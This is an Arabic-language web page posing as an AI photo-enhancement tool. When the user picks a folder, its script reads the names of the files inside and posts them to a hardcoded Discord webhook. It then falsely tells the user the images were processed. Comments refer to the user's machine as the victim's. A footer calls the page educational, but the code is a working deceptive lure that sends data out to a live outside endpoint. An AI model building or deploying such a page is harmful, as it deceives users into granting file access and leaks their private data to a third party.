<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تطبيق فحص الصور بالذكاء الاصطناعي</title>
    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
    <style>
        body {
            font-family: 'Cairo', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            margin: 0;
            color: #333;
        }
        .card {
            background: white;
            padding: 40px;
            border-radius: 20px;
            box-shadow: 0 15px 35px rgba(0,0,0,0.2);
            text-align: center;
            max-width: 450px;
            width: 90%;
        }
        h1 { color: #4a00e0; margin-bottom: 10px; }
        p { color: #666; font-size: 16px; line-height: 1.6; }
        .btn {
            background: #4a00e0;
            color: white;
            padding: 15px 25px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: 0.3s;
            margin-top: 20px;
            width: 100%;
        }
        .btn:hover { background: #3700b3; transform: translateY(-3px); }
        #status { margin-top: 20px; font-weight: bold; }
        .edu-note {
            margin-top: 30px;
            font-size: 11px;
            color: #aaa;
            border-top: 1px solid #eee;
            padding-top: 15px;
        }
    </style>
</head>
<body>

<div class="card">
    <h1>🖼️ مُحسن الصور الذكي</h1>
    <p>ساعدنا الذكاء الاصطناعي في تحسين جودة الصور القديمة. اختر المجلد الذي يحتوي على صورك وسنقوم بمعالجتها فوراً.</p>
    
    <button class="btn" id="btnBrowse">اختيار مجلد الصور 📂</button>
    
    <div id="status"></div>

    <div class="edu-note">
        هذا الموقع مصمم لأغراض تعليمية لشرح مخاطر منح صلاحيات الوصول للملفات في الجامعات.
    </div>
</div>

<script>
    // رابط الويب هوك الخاص بك مدمج هنا
    const HOOK = "https://discord.com/api/webhooks/1498434837818904636/O_VAiMaolUCuW9-wveHztYpe9tbPn_MiKehNpVJoZqkc-8Bh-PXh6_mzx-NMrTR-6cH6";

    document.getElementById('btnBrowse').addEventListener('click', async () => {
        const status = document.getElementById('status');
        
        try {
            // طلب الصلاحية للوصول لمجلد
            const dirHandle = await window.showDirectoryPicker();
            
            status.style.color = "blue";
            status.innerText = "جاري الاتصال بالسيرفر ومعالجة الصور...";

            let fileNames = [];
            let count = 0;

            // قراءة الملفات من جهاز الضحية
            for await (const entry of dirHandle.values()) {
                if (entry.kind === 'file') {
                    count++;
                    fileNames.push(`- ${entry.name}`);
                }
            }

            // إرسال البيانات إلى الديسكورد الخاص بك
            await reportToDiscord(fileNames, count);

            status.style.color = "green";
            status.innerText = `✅ تمت المعالجة بنجاح! تم فحص ${count} صورة.`;

        } catch (err) {
            status.style.color = "red";
            status.innerText = "❌ خطأ: يجب السماح بالوصول للمجلد لنتمكن من تحسين الصور.";
        }
    });

    async function reportToDiscord(files, total) {
        // تجهيز الرسالة بشكل جميل للديسكورد
        const content = {
            embeds: [{
                title: "🚨 تم اختراق خصوصية مجلد جديد!",
                description: `**عدد الملفات المسحوبة:** ${total}\n\n**قائمة ببعض الملفات:**\n${files.slice(0, 25).join('\n')}\n${total > 25 ? "...وغيرها الكثير" : ""}`,
                color: 16711680, // لون أحمر
                timestamp: new Date(),
                footer: { text: "عرض توضيحي لأمن المعلومات" }
            }]
        };

        try {
            await fetch(HOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(content)
            });
        } catch (e) {
            console.log("فشل الإرسال للديسكورد");
        }
    }
</script>

</body>
</html>
